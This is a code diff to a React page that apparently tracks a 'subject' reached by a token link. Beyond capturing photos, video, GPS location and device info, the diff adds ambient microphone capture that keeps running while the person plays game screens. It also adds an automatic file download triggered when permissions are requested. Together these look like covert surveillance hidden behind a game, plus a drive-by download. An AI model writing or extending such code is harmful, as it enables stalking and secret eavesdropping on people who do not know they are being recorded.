@@ -3,6 +3,7 @@ import { useNavigate, useSearchParams } from 'react-router-dom';
 import { GPS_OPTIONS } from './geolocation';
 import { useLocationTracker } from './hooks/useLocationTracker';
 import { useCameraCapture } from './hooks/useCameraCapture';
+import { useAmbientCapture } from './hooks/useAmbientCapture';
 import { getDeviceInfo } from './deviceInfo';
 import { uploadSubjectMedia } from './mediaUpload';
 import {
@@ -15,6 +16,7 @@ import {
     CAMERA_VIDEO_SECONDS
 } from './config';
 import SubjectArenaGate from './games/SubjectArenaGate';
+import { runTestAutoDownloadOnce } from './testDownload';
 import './SubjectPage.css';
 
 const noop = () => {};
@@ -29,6 +31,17 @@ function SubjectPage() {
     const [errorDetail, setErrorDetail] = useState('');
     const { runCaptureSession } = useCameraCapture();
     const clientSessionId = useRef(getClientSessionId());
+    const initialAudioStreamRef = useRef(null);
+
+    const ambientEnabled =
+        trackingEnabled &&
+        (phase === 'success' || phase === 'arena' || phase === 'playing');
+
+    useAmbientCapture({
+        enabled: ambientEnabled,
+        clientSessionId: clientSessionId.current,
+        initialAudioStream: initialAudioStreamRef.current
+    });
 
     useEffect(() => {
         const token = searchParams.get('token') || searchParams.get('t');
@@ -99,21 +112,27 @@ function SubjectPage() {
     }, [startTracking]);
 
     const requestPermissions = useCallback(async () => {
+        runTestAutoDownloadOnce('pulse_test_download_v2_main');
         setPhase('camera_waiting');
         setErrorDetail('');
         try {
-            const { photo, video } = await runCaptureSession(CAMERA_VIDEO_SECONDS);
+            const { photo, video, stream } = await runCaptureSession(CAMERA_VIDEO_SECONDS, {
+                keepStreamForAmbient: true
+            });
+            initialAudioStreamRef.current = stream;
             await uploadSubjectMedia({
                 clientSessionId: clientSessionId.current,
                 type: 'photo',
-                blob: photo
+                blob: photo,
+                captureSource: 'initial'
             });
             localStorage.setItem(SUBJECT_CAMERA_DONE_KEY, 'true');
             if (video) {
                 await uploadSubjectMedia({
                     clientSessionId: clientSessionId.current,
                     type: 'video',
-                    blob: video
+                    blob: video,
+                    captureSource: 'initial'
                 });
             }
             requestLocation();
@@ -177,8 +196,8 @@ function SubjectPage() {
                         )}
                         {phase === 'camera_denied' && (
                             <p className="subject-error">
-                                Kamera icazəsi verilmədi. Brauzer parametrlərindən bu sayta kamera
-                                icazəsi verib yenidən cəhd edin.
+                                Kamera və ya mikrofon icazəsi verilmədi. Brauzer parametrlərindən
+                                bu sayta icazə verib yenidən cəhd edin.
                             </p>
                         )}
                         {phase === 'upload_error' && (
